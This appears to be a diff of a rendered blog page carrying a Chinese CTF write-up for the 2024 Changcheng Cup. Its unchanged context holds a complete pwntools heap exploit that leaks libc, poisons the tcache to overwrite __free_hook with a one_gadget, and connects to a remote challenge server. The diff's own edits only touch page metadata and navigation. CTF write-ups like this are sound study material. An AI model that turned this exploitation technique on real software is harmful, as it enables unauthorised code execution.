@@ -415,7 +415,7 @@ a1输入的值是存储到a3中，且malloc的数也是解引用的a3地址的�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.4k
                 </div>
                 
 
@@ -465,7 +465,6 @@ a1输入的值是存储到a3中，且malloc的数也是解引用的a3地址的�
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#--------------------setting context---------------------</span><br><span class="line">context.clear(arch='amd64', os='linux', log_level='debug')</span><br><span class="line"></span><br><span class="line">context.terminal = ['tmux', 'splitw', '-h']</span><br><span class="line">sla = lambda data, content: io.sendlineafter(data,content)</span><br><span class="line">sa = lambda data, content: io.sendafter(data,content)</span><br><span class="line">sl = lambda data: io.sendline(data)</span><br><span class="line">rl = lambda data: io.recvuntil(data)</span><br><span class="line">re = lambda data: io.recv(data)</span><br><span class="line">sa = lambda data, content: io.sendafter(data,content)</span><br><span class="line">inter = lambda: io.interactive()</span><br><span class="line">l64 = lambda:u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))</span><br><span class="line">h64=lambda:u64(io.recv(6).ljust(8,b'\x00'))</span><br><span class="line">s=lambda data: io.send(data)</span><br><span class="line">log_addr=lambda data: log.success("---&gt;"+hex(data))</span><br><span class="line">p = lambda s: print('\033[1;31;40m%s --&gt; 0x%x \033[0m' % (s, eval(s)))</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">#---------------------------------------------------------</span><br><span class="line"># libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')</span><br><span class="line">filename = "./Heap"</span><br><span class="line">#io = process(filename)</span><br><span class="line">io = remote("8.147.128.54",30786)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#初始化完成---------------------------------------------------------\</span><br><span class="line">def add(size,content):</span><br><span class="line">    rl("What will you do, adventurer? ")</span><br><span class="line">    sl(str(1))</span><br><span class="line">    rl("Enter the size of the block you wish to summon (1 to 1280 bytes): ")</span><br><span class="line">    sl(str(size))</span><br><span class="line">    rl("has been summoned. Enter its contents (up to 512 bytes):\n")</span><br><span class="line">    sl(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">    rl("What will you do, adventurer? ")</span><br><span class="line">    sl(str(2))</span><br><span class="line">    rl("Which block will you let go? Enter the index (0-19): ")</span><br><span class="line">    sl(str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    rl("What will you do, adventurer? ")</span><br><span class="line">    sl(str(3))</span><br><span class="line">    rl("Which block would you like to rewrite? Enter the index (0-19): ")</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    rl("current size is 512 bytes. Enter the new content (up to 512 bytes):\n")</span><br><span class="line">    sl(content)</span><br><span class="line">def show(idx):</span><br><span class="line">    rl("What will you do, adventurer? ")</span><br><span class="line">    sl(str(4))</span><br><span class="line">    rl("Which block's secrets would you like to uncover? Enter the index (0-19): ")</span><br><span class="line">    sl(str(idx))</span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0x200,b'a')</span><br><span class="line">for i in range(9):</span><br><span class="line">    delete(i)</span><br><span class="line">show(7)</span><br><span class="line">libc_addr=l64()-0x1ebbe0</span><br><span class="line">libc.address=libc_addr</span><br><span class="line">free_hook=libc.sym['__free_hook']</span><br><span class="line">ogg=libc_addr+0xe6c81</span><br><span class="line">log_addr(ogg)</span><br><span class="line">#0xe6c81 0xe6c84</span><br><span class="line">log_addr(libc_addr)</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># edit(0,p64(free_hook))</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line"># add(0x200,b'a')</span><br><span class="line">edit(6,p64(free_hook))</span><br><span class="line">add(0x200,b'a')</span><br><span class="line">add(0x200,p64(ogg))</span><br><span class="line">inter()</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/pic/2024ccb-wp/image-20240909090919760.png" alt="image-20240909090919760"></p>
-<p><a href="/pic/1.pdf">实战SRC验证逻辑挖掘分享案例.pdf</a></p>
 
                 
             </div>
@@ -610,18 +609,17 @@ a1输入的值是存储到a3中，且malloc的数也是解引用的a3地址的�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/09/19/2024ccb-wp/">
+                <a href="/2024/10/16/orw_stack/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="2024长城杯wp">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="house-of-banana">
                         
-                        <span class="card-title">2024长城杯wp</span>
+                        <span class="card-title">house-of-banana</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -631,27 +629,26 @@ a1输入的值是存储到a3中，且malloc的数也是解引用的a3地址的�
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-10-16
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    比赛复现
+                            <a href="/categories/pwn%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    pwn学习
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0-2024%E9%95%BF%E5%9F%8E%E6%9D%AF/">
-                        <span class="chip bg-color">比赛复现---2024长城杯</span>
+                    <a href="/tags/orw-stack/">
+                        <span class="chip bg-color">orw_stack</span>
                     </a>
                     
                 </div>
